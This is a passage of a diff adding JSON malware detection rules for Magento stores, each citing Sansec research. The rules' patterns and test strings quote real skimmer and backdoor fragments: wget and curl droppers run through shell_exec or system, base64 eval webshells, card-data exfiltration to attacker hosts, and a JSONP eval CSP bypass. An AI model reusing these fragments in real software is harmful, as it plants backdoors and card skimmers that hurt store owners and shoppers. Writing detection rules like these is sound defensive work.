+            "pattern": "Object.defineProperty(window.parent, \"postMessage\", {",
+            "description": "Matches the redefinition of window.parent.postMessage used by the ClickFix loader to intercept messages of type \"v\" and copy an attacker command to the clipboard. Overriding parent postMessage from an embedded frame is not expected in store themes. Source: Sansec, ClickFix malware hits DoD cybersecurity vendor homepage.",
+            "test_should_match": [
+                "Object.defineProperty(window.parent, \"postMessage\", {"
+            ],
+            "test_should_not_match": [
+                "window.parent.postMessage(payload, \"*\");"
+            ]
+        },
+        {
+            "id": "clickfix-webdriver-evasion-markers",
+            "name": "ClickFix automation-driver detection markers",
+            "severity": "warning",
+            "source": "https://sansec.io/research/clickfix-clipboard-hijacker",
+            "target": [
+                "design_config",
+                "cms_content"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/__(selenium_unwrapped|fxdriver_unwrapped|webdriver_evaluate)/",
+            "description": "Matches the WebDriver artifacts checked by the ClickFix loader to avoid running in automated browsers and security scanners. Legitimate store JavaScript does not probe for these. Source: Sansec, ClickFix malware hits DoD cybersecurity vendor homepage.",
+            "test_should_match": [
+                "if (window.__selenium_unwrapped) { return; }"
+            ],
+            "test_should_not_match": [
+                "var selenium_config = {};"
+            ]
+        },
+        {
+            "id": "invisible-overlay-binary-onclick-decoder",
+            "name": "Invisible full-page overlay decoding onclick from whitespace binary",
+            "severity": "critical",
+            "source": "https://sansec.io/research/cosmicsting-fallout",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "c=b.replace(/\\u2003/g, '0').replace(/\\u2006/g, '1')",
+            "description": "Matches the onmousemove handler of an invisible overlay that converts em-space and six-per-em-space characters to binary, rebuilds an onclick payload and clicks it. Source: Sansec, CosmicSting fallout.",
+            "test_should_match": [
+                "onmousemove=\"let h=this,b=h.innerHTML,c=b.replace(/\\u2003/g, '0').replace(/\\u2006/g, '1'),d='';"
+            ],
+            "test_should_not_match": [
+                "let text = html.replace(/\\u2003/g, ' ');"
+            ]
+        },
+        {
+            "id": "svg-onload-xor-reverse-eval",
+            "name": "SVG onload XOR-decodes reversed string and evaluates it",
+            "severity": "critical",
+            "source": "https://sansec.io/research/cosmicsting-fallout",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "String.fromCharCode(aa.charCodeAt(0)^t.charCodeAt(n%t.length))",
+            "description": "Matches the SVG onload payload that reverses an escaped string, XORs each character with a key and passes the result to new Function. Source: Sansec, CosmicSting fallout.",
+            "test_should_match": [
+                "return String.fromCharCode(aa.charCodeAt(0)^t.charCodeAt(n%t.length))}).join('')}(aa.split('').reverse().join(''),t);new Function(n)()"
+            ],
+            "test_should_not_match": [
+                "return String.fromCharCode(code.charCodeAt(0));"
+            ]
+        },
+        {
+            "id": "numeric-split-marker-function-decoder",
+            "name": "Base-N numeric payload decoded via k77 split and Function()",
+            "severity": "critical",
+            "source": "https://sansec.io/research/cosmicsting-fallout",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "q52223.split(\"k77\")",
+            "description": "Matches the decoder that splits a numeric-encoded string on the literal marker k77, parses base-28 pairs, XORs them and runs the result through Function(). Source: Sansec, CosmicSting fallout.",
+            "test_should_match": [
+                "var k79680 = q52223.split(\"k77\"),"
+            ],
+            "test_should_not_match": [
+                "var parts = header.split(\"-\");"
+            ]
+        },
+        {
+            "id": "checkout-statspots-double-base64-beacon",
+            "name": "Checkout loader sending double base64 host to statspots",
+            "severity": "critical",
+            "source": "https://sansec.io/research/cosmicsting-fallout",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "s=\" + btoa(btoa(location.host))",
+            "description": "Matches the checkout-only script injection that builds a statspots.com URL from double base64 encoded location.host. Source: Sansec, CosmicSting fallout.",
+            "test_should_match": [
+                "j.src = \"https://statspots.com/get/?s=\" + btoa(btoa(location.host));"
+            ],
+            "test_should_not_match": [
+                "j.src = \"https://cdn.example.com/get/?s=\" + btoa(location.host);"
+            ]
+        },
+        {
+            "id": "cosmicsting-split-k77-base28-decoder",
+            "name": "CosmicSting base-28 split k77 JS payload decoder",
+            "severity": "critical",
+            "source": "https://sansec.io/research/cosmicsting",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\.split\\(\"k77\"\\)/",
+            "description": "Matches the split on the literal delimiter \"k77\" used by the CosmicSting obfuscated loader, which then parses numbers in base 28 and runs the decoded string with Function(). The delimiter is unusual in legitimate Magento JavaScript. Source: Sansec, CosmicSting.",
+            "test_should_match": [
+                "var k79680 = q52223.split(\"k77\"),"
+            ],
+            "test_should_not_match": [
+                "var parts = csvLine.split(\",\");"
+            ]
+        },
+        {
+            "id": "magecart-records-endpoint-lookup",
+            "name": "Skimmer fetches base64 exfil URL from nstatistics records endpoint",
+            "severity": "critical",
+            "source": "https://sansec.io/research/csu-shop-magecarted",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "jQuery.get(\"//records.nstatistics.com/records.php?standart\"",
+            "description": "Matches the jQuery call that retrieves the base64 encoded exfiltration URL from a fixed records endpoint before posting stolen checkout data. Source: Sansec, CSU shop MageCart.",
+            "test_should_match": [
+                "    jQuery.get(\"//records.nstatistics.com/records.php?standart\", function(record) {"
+            ],
+            "test_should_not_match": [
+                "    jQuery.get(\"//cdn.example.com/records.php?page=2\", function(record) {"
+            ]
+        },
+        {
+            "id": "magecart-billing-base64-post-exfil",
+            "name": "Billing fields base64-encoded and POSTed to remote host",
+            "severity": "critical",
+            "source": "https://sansec.io/research/csu-shop-magecarted",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "\"billing=\" + encodeURIComponent(btoa(JSON.stringify(billing)))",
+            "description": "Matches the AJAX POST that base64-encodes the collected billing object and sends it, with the cookie, to a remote URL. Source: Sansec, CSU shop MageCart.",
+            "test_should_match": [
+                "                data: \"billing=\" + encodeURIComponent(btoa(JSON.stringify(billing))) + \"&target=\" + location.host + \"&valid=\" + encodeURIComponent(document.cookie)"
+            ],
+            "test_should_not_match": [
+                "                data: \"billing=\" + encodeURIComponent(JSON.stringify(billing))"
+            ]
+        },
+        {
+            "id": "paypalplus-slot-fake-card-form-injection",
+            "name": "Fake credit card form injected into PayPal Plus checkout slot",
+            "severity": "critical",
+            "source": "https://sansec.io/research/csu-shop-magecarted",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "#checkout-payment-method-load .iways_paypalplus_payment:first\").html(form);",
+            "description": "Matches the injection of an attacker-built credit card form (form variable) into the iWays PayPal Plus payment slot on Magento checkout. Source: Sansec, CSU shop MageCart.",
+            "test_should_match": [
+                "    jQuery(\"#checkout-payment-method-load .iways_paypalplus_payment:first\").html(form);"
+            ],
+            "test_should_not_match": [
+                "    jQuery(\"#checkout-payment-method-load .iways_paypalplus_payment:first\").show();"
+            ]
+        },
+        {
+            "id": "rat-concat-obfuscated-shell-exec",
+            "name": "Backdoor builds shell_exec name from string fragments",
+            "severity": "critical",
+            "source": "https://sansec.io/research/ecommerce-rat-leaks-victims",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "$dum4 = 's'.'hell'.'_ex'.'ec';",
+            "description": "Concatenated string that hides the shell_exec function name in a PHP backdoor that runs shell commands for an attacker. Source: Sansec, ecommerce RAT leaks victims.",
+            "test_should_match": [
+                "$dum4 = 's'.'hell'.'_ex'.'ec';"
+            ],
+            "test_should_not_match": [
+                "$label = 'shell'.'_ex'.'ec';"
+            ]
+        },
+        {
+            "id": "rat-bdor-command-banner",
+            "name": "Backdoor command prompt banner bdor@command",
+            "severity": "critical",
+            "source": "https://sansec.io/research/ecommerce-rat-leaks-victims",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "bdor@command$",
+            "description": "Prompt banner echoed by the bdor PHP remote shell before each command output. Source: Sansec, ecommerce RAT leaks victims.",
+            "test_should_match": [
+                "echo (\"bdor@command$ \" . $in . \"\\n\");"
+            ],
+            "test_should_not_match": [
+                "echo (\"user@server$ \" . $in . \"\\n\");"
+            ]
+        },
+        {
+            "id": "skimmer-hardcoded-key-4d25",
+            "name": "Skimmer hard-coded AES key",
+            "severity": "critical",
+            "source": "https://sansec.io/research/fake-google-analytics-malware",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "4d25a9bb5f714290adb1334942e2e94f0c2595f5af50aeb9bc811717650fce08",
+            "description": "Hard-coded passphrase used by the fake analytics skimmer to encrypt stolen card data. Source: Sansec, fake Google Analytics malware.",
+            "test_should_match": [
+                "var password = '4d25a9bb5f714290adb1334942e2e94f0c2595f5af50aeb9bc811717650fce08';"
+            ],
+            "test_should_not_match": [
+                "var password = '0000000000000000000000000000000000000000000000000000000000000000';"
+            ]
+        },
+        {
+            "id": "klaviyo-attacker-order-cleanup-sql",
+            "name": "Attacker SQL cleanup of getTemplateFilter order traces",
+            "severity": "critical",
+            "source": "https://sansec.io/research/fake-klaviyo-accounts-added-to-magento",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "customer_firstname like '%getTemplateFilter%'",
+            "description": "Matches the SQL that deletes sales orders, quotes and grid rows whose customer name contains the getTemplateFilter payload string, used by the attacker to remove traces of its mail template injection. Source: Sansec, fake Klaviyo accounts added to Magento.",
+            "test_should_match": [
+                "delete from \" . $prefix . \"sales_order where customer_firstname like '%getTemplateFilter%' or customer_lastname like 'system'"
+            ],
+            "test_should_not_match": [
+                "select * from sales_order where customer_firstname like 'John%'"
+            ]
+        },
+        {
+            "id": "xor-obfuscated-websocket-c2-loader",
+            "name": "XOR-decoded WebSocket C2 loader executing received code",
+            "severity": "critical",
+            "source": "https://sansec.io/research/google-services-abused-skimming-campaigns",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/new WebSocket\\(String\\.fromCharCode\\(\\.\\.\\.\\w+\\.map\\(\\w+ => \\w+ \\^ \\w+\\)\\)/",
+            "description": "Matches the loader that rebuilds a WebSocket C2 URL from an XOR-encoded number array (array.map with ^ key) and executes each received message with new Function. Same technique is used in the CosmicSting (cnext) backdoor loader. Source: Sansec, Google services abused in skimming campaigns.",
+            "test_should_match": [
+                "window.ww = new WebSocket(String.fromCharCode(...qxth.map(jbqr => jbqr ^ mld)) + encodeURIComponent(location.href));",
+                "window.ww = new WebSocket(String.fromCharCode(...xcmw.map(hnax => hnax ^ tpkd)) + encodeURIComponent(location.href));"
+            ],
+            "test_should_not_match": [
+                "window.ws = new WebSocket(String.fromCharCode(72, 105));",
+                "const socket = new WebSocket(config.url);"
+            ]
+        },
+        {
+            "id": "jsonp-eval-callback-accounts-google-revoke",
+            "name": "JSONP callback=eval() abuse of Google OAuth revoke endpoint",
+            "severity": "critical",
+            "source": "https://sansec.io/research/google-services-abused-skimming-campaigns",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "accounts.google.com/o/oauth2/revoke?callback=eval(",
+            "description": "Matches a script include that uses the Google OAuth revoke endpoint as a JSONP gadget with callback=eval(, which executes the response as script to bypass CSP. Source: Sansec, Google services abused in skimming campaigns.",
+            "test_should_match": [
+                "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=eval(...)\"></script>"
+            ],
+            "test_should_not_match": [
+                "<script src=\"https://accounts.google.com/o/oauth2/revoke?token=abc\"></script>"
+            ]
+        },
+        {
+            "id": "gorgonagora-payment-iframe-provider-id",
+            "name": "GorgonAgora fake payment iframe provider ID",
+            "severity": "critical",
+            "source": "https://sansec.io/research/gorgonagora-fake-storefront-skimming-network",
+            "target": [
+                "cms_content",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "pp_payment-iframe_payment-iframe",
+            "description": "Matches the provider ID used by the GorgonAgora fake payment iframe skimmer (payment-vanilla.iife.js). The ID is not used by any legitimate Magento payment module. Source: Sansec, GorgonAgora: 4,800+ fake storefronts skim cards across hundreds of impersonated brands.",
+            "test_should_match": [
+                "pp_payment-iframe_payment-iframe"
+            ],
+            "test_should_not_match": [
+                "pp_payment-iframe",
+                "payment-iframe-container"
+            ]
+        },
+        {
+            "id": "js-csp-fetchdata-exfil-beacon",
+            "name": "js-csp.com fetchData base64 exfil beacon",
+            "severity": "critical",
+            "source": "https://sansec.io/research/keylogger-major-us-bank-employees",
+            "target": [
+                "pub_php",
+                "design_config",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": "\"https://js-csp.com/fetchData/?data=\" +",
+            "description": "Matches the image-beacon exfiltration line that sends base64-encoded form data to the js-csp.com fetchData endpoint. The concatenation with the data parameter is the exfil call used by this keylogger kit. Source: Sansec, keylogger on major US bank employees.",
+            "test_should_match": [
+                "\"https://js-csp.com/fetchData/?data=\" +"
+            ],
+            "test_should_not_match": [
+                "\"https://www.example.com/fetchData/?data=\" +"
+            ]
+        },
+        {
+            "id": "js-csp-checkout-charcode-injector",
+            "name": "Char-code array decoding to checkout injector loader",
+            "severity": "critical",
+            "source": "https://sansec.io/research/keylogger-major-us-bank-employees",
+            "target": [
+                "pub_php",
+                "design_config",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": "[99, 104, 101, 99, 107, 111, 117, 116],",
+            "description": "Matches the char-code array that spells \"checkout\", used as the URL-gate in the self-invoking injector. The script only injects the remote getInjector loader when the page URL contains this word. Source: Sansec, keylogger on major US bank employees.",
+            "test_should_match": [
+                "  [99, 104, 101, 99, 107, 111, 117, 116],"
+            ],
+            "test_should_not_match": [
+                "  [99, 100, 101, 99, 107, 111, 117, 116],"
+            ]
+        },
+        {
+            "id": "license-class-hardcoded-secure-sign-keys",
+            "name": "Hardcoded SECURE_KEY/SIGN_KEY in License backdoor class",
+            "severity": "critical",
+            "source": "https://sansec.io/research/license-backdoor",
+            "target": [
+                "pub_php",
+                "generated_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "const SECURE_KEY = '83ba291cd9201e9a28173741bac82745';",
+            "description": "Matches the SECURE_KEY constant of the License class used by a backdoor that loads a license file with include_once. Source: Sansec, License backdoor.",
+            "test_should_match": [
+                "    const SECURE_KEY = '83ba291cd9201e9a28173741bac82745';"
+            ],
+            "test_should_not_match": [
+                "    const SECURE_KEY = 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4';"
+            ]
+        },
+        {
+            "id": "template-attack-health-check-webshell-b64",
+            "name": "Base64 eval webshell written as pub/health_check.php",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-template-attacks",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "PD9waHAKaWYoaXNzZXQoJF9QT1NUWyJhdGEiXSkpCnskdl9kYXRhPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJhdGEiXSk7CkBldmFsKCR2X2RhdGEpOwpleGl0KDApOwp9",
+            "description": "Matches the base64 body of the eval webshell that the template attack injects as pub/health_check.php. It decodes to a POST parameter 'ata' that is base64-decoded and passed to eval(). The blob is specific to this campaign. Source: Sansec, Surge in Magento 2 template attacks.",
+            "test_should_match": [
+                "$injStr = \"PD9waHAKaWYoaXNzZXQoJF9QT1NUWyJhdGEiXSkpCnskdl9kYXRhPWJhc2U2NF9kZWNvZGUoJF9QT1NUWyJhdGEiXSk7CkBldmFsKCR2X2RhdGEpOwpleGl0KDApOwp9\";"
+            ],
+            "test_should_not_match": [
+                "$health = base64_encode('Magento health check OK');",
+                "$payload = 'PD9waHAKZWNobyAiaGVsbG8iOwo=';"
+            ]
+        },
+        {
+            "id": "template-attack-interceptor-create-function-backdoor",
+            "name": "Backdoor in generated FrontController Interceptor via create_function",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-2-template-attacks",
+            "target": [
+                "generated_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "create_function('$w1, $h3'",
+            "description": "Matches the injected code in generated/code/Magento/Framework/App/FrontController/Interceptor.php. The backdoor builds a function with create_function() taking $w1 (request params) and $h3 (a key), then evals a base64-decoded frontName parameter. The two-variable parameter list is specific to this injection. Source: Sansec, Surge in Magento 2 template attacks.",
+            "test_should_match": [
+                "$__init_function = @create_function('$w1, $h3', \"$cryption_block\");"
+            ],
+            "test_should_not_match": [
+                "$fn = create_function('$a, $b', 'return $a + $b;');",
+                "$fn = create_function('$item', 'return trim($item);');"
+            ]
+        },
+        {
+            "id": "polyshell-webshell-cookie-eval-base64",
+            "name": "PolyShell webshell eval of base64 request input",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-polyshell",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "eval(base64_decode($_REQUEST[\"id\"]))",
+            "description": "Eval of base64-decoded request input, the code-execution step of the PolyShell GIF89a polyglot webshell dropped under pub/media/custom_options. Source: Sansec, PolyShell: unrestricted file upload in Magento and Adobe Commerce.",
+            "test_should_match": [
+                "eval(base64_decode($_REQUEST[\"id\"]))"
+            ],
+            "test_should_not_match": [
+                "$payload = base64_decode($_REQUEST[\"id\"]);",
+                "eval($compiled_template);"
+            ]
+        },
+        {
+            "id": "polyshell-cookie-hash-gate",
+            "name": "PolyShell webshell gated by hard-coded cookie hash",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-polyshell",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "a17028468cb2a870d460676d6d6da3ad63706778e3",
+            "description": "Hard-coded hash that the cookie value must match before the PolyShell polyglot shell accepts eval input. Source: Sansec, PolyShell: unrestricted file upload in Magento and Adobe Commerce.",
+            "test_should_match": [
+                "if (sha1($_COOKIE['d']) === 'a17028468cb2a870d460676d6d6da3ad63706778e3') {"
+            ],
+            "test_should_not_match": [
+                "if (sha1($_COOKIE['d']) === '5e884898da28047151d0e56f8dc6292773603d0d') {"
+            ]
+        },
+        {
+            "id": "env-php-credential-reader-eval",
+            "name": "Dropper reads app/etc/env.php and evals the parsed config",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-wish-list-exploits",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "$a=eval(\"$\".\"b=\".$a[1]);",
+            "description": "Backdoor fragment that reads app/etc/env.php, splits it on 'return' and evals the array so it can reuse the Magento database credentials. Source: Sansec, Magento wish list exploits.",
+            "test_should_match": [
+                "$a=explode(\"return\",$a);$a=eval(\"$\".\"b=\".$a[1]);"
+            ],
+            "test_should_not_match": [
+                "$a=explode(\"return\",$a);$a=trim($a[1]);"
+            ]
+        },
+        {
+            "id": "magento-interceptor-post-eval-backdoor",
+            "name": "Interceptor.php POST-triggered eval backdoor",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-xml-backdoor",
+            "target": [
+                "generated_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\\$_POST\\s*\\[\\s*\"7faa27b473\"\\s*\\]/",
+            "description": "Matches the POST parameter check injected into a generated Interceptor class that triggers eval of a reversed base64 payload. The parameter name is the backdoor's fixed trigger. Source: Sansec, Magento XML backdoor.",
+            "test_should_match": [
+                "  if  (  isset  (   $_POST  [   \"7faa27b473\" ])  )   {"
+            ],
+            "test_should_not_match": [
+                "  if (isset($_POST['form_key'])) {"
+            ]
+        },
+        {
+            "id": "magento-interceptor-base64-de-concat",
+            "name": "Interceptor.php concatenated base64_decode obfuscation",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magento-xml-backdoor",
+            "target": [
+                "generated_php"
+            ],
+            "pattern_type": "regex",
+            "pattern": "/\"bas\"\\s*\\.\\s*\"e64_de\"\\s*\\.\\s*\"code\"/",
+            "description": "Matches the string split of base64_decode into \"bas\" . \"e64_de\" . \"code\" used to hide the decoder function name in the injected Interceptor backdoor. Source: Sansec, Magento XML backdoor.",
+            "test_should_match": [
+                "    $catalogQuery  =\"bas\" .   \"e64_de\".   \"code\" ;"
+            ],
+            "test_should_not_match": [
+                "    $value = base64_decode($encoded);"
+            ]
+        },
+        {
+            "id": "magentocore-clean-php-dropper",
+            "name": "Dropper fetching clean.php/clear.php into app/code/core via wget",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magentocore.net-skimmer-most-aggressive-to-date",
+            "target": [
+                "pub_php",
+                "generated_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "shell_exec(\"wget -c https://magentocore.net/clean.json -O ./app/code/core/clean.php 2>&1\");",
+            "description": "Matches the shell_exec call that downloads a PHP file from magentocore.net into app/code/core, runs it, and deletes it. The domain and target path together identify this dropper. Source: Sansec, magentocore.net skimmer.",
+            "test_should_match": [
+                "shell_exec(\"wget -c https://magentocore.net/clean.json -O ./app/code/core/clean.php 2>&1\");"
+            ],
+            "test_should_not_match": [
+                "shell_exec(\"wget -c https://example.com/archive.tar.gz -O ./var/tmp/archive.tar.gz 2>&1\");"
+            ]
+        },
+        {
+            "id": "magentocore-mage-js-script-src",
+            "name": "Script tag loading magentocore.net/mage/mage.js",
+            "severity": "critical",
+            "source": "https://sansec.io/research/magentocore.net-skimmer-most-aggressive-to-date",
+            "target": [
+                "design_config",
+                "cms_content",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "src=\"https://magentocore.net/mage/mage.js\"",
+            "description": "Matches the script src pointing to the skimmer file mage.js hosted on magentocore.net. Source: Sansec, magentocore.net skimmer.",
+            "test_should_match": [
+                "  src=\"https://magentocore.net/mage/mage.js\"\n></script>"
+            ],
+            "test_should_not_match": [
+                "  src=\"https://cdn.example.com/mage/mage.js\"></script>"
+            ]
+        },
+        {
+            "id": "telegram-first-name-github-loader-split",
+            "name": "Script URL built from Telegram bot first_name split on comma",
+            "severity": "critical",
+            "source": "https://sansec.io/research/malware-persistence-via-telegram-and-github",
+            "target": [
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "resp.result.first_name.split(\",\")",
+            "description": "Splits the Telegram bot first_name into a GitHub Pages user and path to build a remote script URL. Source: Sansec, malware persistence via Telegram and GitHub.",
+            "test_should_match": [
+                "const [username, path] = resp.result.first_name.split(\",\");"
+            ],
+            "test_should_not_match": [
+                "const [first, last] = resp.user.name.split(\" \");"
+            ]
+        },
+        {
+            "id": "skimmer-xor-decoder-loop",
+            "name": "XOR string decoder used to hide skimmer identifiers",
+            "severity": "critical",
+            "source": "https://sansec.io/research/polymorphic-skimmer-57-payment-gateways",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "r += String.fromCharCode(x ^ String(k[j]).charCodeAt());",
+            "description": "Hex-pair XOR decoder that rebuilds DOM and selector names at runtime inside a GTM-disguised skimmer. Source: Sansec, polymorphic skimmer on 57 payment gateways.",
+            "test_should_match": [
+                "r += String.fromCharCode(x ^ String(k[j]).charCodeAt());"
+            ],
+            "test_should_not_match": [
+                "r += String.fromCharCode(x + 1);"
+            ]
+        },
+        {
+            "id": "skimmer-xor-key-pxwe8al23pjj",
+            "name": "Skimmer XOR key pxwe8al23pjj",
+            "severity": "critical",
+            "source": "https://sansec.io/research/polymorphic-skimmer-57-payment-gateways",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "pxwe8al23pjj",
+            "description": "Key string used by the polymorphic skimmer's pickFooter decoder to recover hidden method and element names. Source: Sansec, polymorphic skimmer on 57 payment gateways.",
+            "test_should_match": [
+                "var sortResult = pickFooter(\"031b050c4815\", \"pxwe8al23pjj\"),"
+            ],
+            "test_should_not_match": [
+                "var sortResult = pickFooter(\"031b050c4815\", \"abcdefghijkl\"),"
+            ]
+        },
+        {
+            "id": "polyshell-localstorage-onclick-id",
+            "name": "PolyShell localStorage onclick restore keyed 136c1e07507f4a97",
+            "severity": "critical",
+            "source": "https://sansec.io/research/polyshell-mass-attack-wave",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "var id='136c1e07507f4a97';",
+            "description": "Matches the localStorage key used by the PolyShell script to store a base64 onclick payload, which it then executes via a synthetic anchor click. The fixed 16-hex key identifies this campaign. Source: Sansec, PolyShell mass attack wave.",
+            "test_should_match": [
+                "  var id='136c1e07507f4a97';"
+            ],
+            "test_should_not_match": [
+                "  var id='cart_block_2';"
+            ]
+        },
+        {
+            "id": "polyshell-base64-referrer-script-host",
+            "name": "PolyShell base64 script URL to lanhd6549tdhse.top",
+            "severity": "critical",
+            "source": "https://sansec.io/research/polyshell-mass-attack-wave",
+            "target": [
+                "cms_content",
+                "design_config",
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "s.src=atob('aHR0cHM6Ly9sYW5oZDY1NDl0ZGhzZS50b3AvS1p0QnNjZ2I/JnNlX3JlZmVycmVyPQ==')",
+            "description": "Matches the script loader that builds its src by base64-decoding a URL on the lanhd6549tdhse.top host and appending the referrer and page title. Source: Sansec, PolyShell mass attack wave.",
+            "test_should_match": [
+                "  s.src=atob('aHR0cHM6Ly9sYW5oZDY1NDl0ZGhzZS50b3AvS1p0QnNjZ2I/JnNlX3JlZmVycmVyPQ==')"
+            ],
+            "test_should_not_match": [
+                "  s.src=atob('aHR0cHM6Ly9jZG4uZXhhbXBsZS5jb20vYXBwLmpz')"
+            ]
+        },
+        {
+            "id": "postponed-exfil-detach-checkout-class",
+            "name": "DetachCheckout skimmer class",
+            "severity": "critical",
+            "source": "https://sansec.io/research/postponed-exfiltration-evades-detection",
+            "target": [
+                "pub_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "class DetachCheckout extends DetachHandler",
+            "description": "Matches the DetachCheckout class from the postponed-exfiltration skimmer, which holds card data in localStorage and sends it later. The class and base-class names are specific to this skimmer. Source: Sansec, Postponed Exfiltration Evades Detection.",
+            "test_should_match": [
+                "class DetachCheckout extends DetachHandler"
+            ],
+            "test_should_not_match": [
+                "class DetachCheckout extends Component",
+                "class CheckoutDetach extends DetachHandler"
+            ]
+        },
+        {
+            "id": "fishpig-lic-png-binary-download-exec",
+            "name": "FishPig-themed PHP downloads and executes lic.bin",
+            "severity": "critical",
+            "source": "https://sansec.io/research/rekoobe-fishpig-magento",
+            "target": [
+                "pub_php",
+                "generated_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "@system(\"cd ~/;curl https://license.fishpig.co.uk/image/dev/lic.png -o lic.bin;chmod 777 lic.bin;./lic.bin '",
+            "description": "Matches the PHP system() call that curls a fake image named lic.png, makes it executable, runs it with the admin domain as argument, then deletes it. The exact URL path and command chain identify this backdoor. Source: Sansec, Rekoobe FishPig Magento.",
+            "test_should_match": [
+                "@system(\"cd ~/;curl https://license.fishpig.co.uk/image/dev/lic.png -o lic.bin;chmod 777 lic.bin;./lic.bin '\" . $this->adminDomain . \"';rm lic.bin\");"
+            ],
+            "test_should_not_match": [
+                "@system(\"cd ~/;curl https://example.com/update.tar.gz -o update.tgz\");"
+            ]
+        },
+        {
+            "id": "fishpig-varnish-lock-file",
+            "name": "Lock file /tmp/.varnish7684 used to gate the payload",
+            "severity": "warning",
+            "source": "https://sansec.io/research/rekoobe-fishpig-magento",
+            "target": [
+                "pub_php",
+                "generated_php"
+            ],
+            "pattern_type": "literal",
+            "pattern": "$tmp = '/tmp/.varnish7684';",
+            "description": "Matches the hidden lock file path the Rekoobe payload uses with flock to ensure only one instance runs. The specific dotted name is unlikely in legitimate code. Source: Sansec, Rekoobe FishPig Magento.",
+            "test_should_match": [
+                "$tmp = '/tmp/.varnish7684';"
+            ],
+            "test_should_not_match": [
+                "$tmp = '/tmp/cache_lock.tmp';"
+            ]
+        },
+        {
+            "id": "fake-ga-object-xxmga",
+            "name": "Fake Google Analytics object _xxmga in hidden iframe",
+            "severity": "critical",
+            "source": "https://sansec.io/research/skimming-google-defeats-csp",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "_xxmga",
+            "description": "Renamed GoogleAnalyticsObject used by the skimmer's hidden iframe to send stolen fields through a real analytics script. Source: Sansec, skimming via Google defeats CSP.",
+            "test_should_match": [
+                "_xxmga('create','UA-169607397-1','auto')"
+            ],
+            "test_should_not_match": [
+                "ga('create','UA-169607397-1','auto')"
+            ]
+        },
+        {
+            "id": "skimmer-xor-key-c879",
+            "name": "Skimmer RC4 key for exfiltrated fields",
+            "severity": "critical",
+            "source": "https://sansec.io/research/skimming-google-defeats-csp",
+            "target": [
+                "pub_php",
+                "cms_content",
+                "design_config"
+            ],
+            "pattern_type": "literal",
+            "pattern": "var H = 'c879f68417529b0c3851a7e336089fcb2c116b8d';",
+            "description": "Hard-coded key passed to the skimmer's xorEncode routine before base64 encoding stolen form data. Source: Sansec, skimming via Google defeats CSP.",
+            "test_should_match": [
+                "var H = 'c879f68417529b0c3851a7e336089fcb2c116b8d';"
+            ],
+            "test_should_not_match": [
+                "var H = 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0';"
+            ]
+        },
+        {
+            "id": "stripe-skimmer-hardcoded-secret-key",
+            "name": "Stripe secret key embedded in browser JS (skimmer C2)",
+            "severity": "critical",
+            "source": "https://sansec.io/research/stripe-api-skimmer-infrastructure",
+            "target": [
+                "pub_php",
+                "cms_content"
+            ],
+            "pattern_type": "literal",
+            "pattern": "sk_test_51Shuxz4fAPbvfTkr",
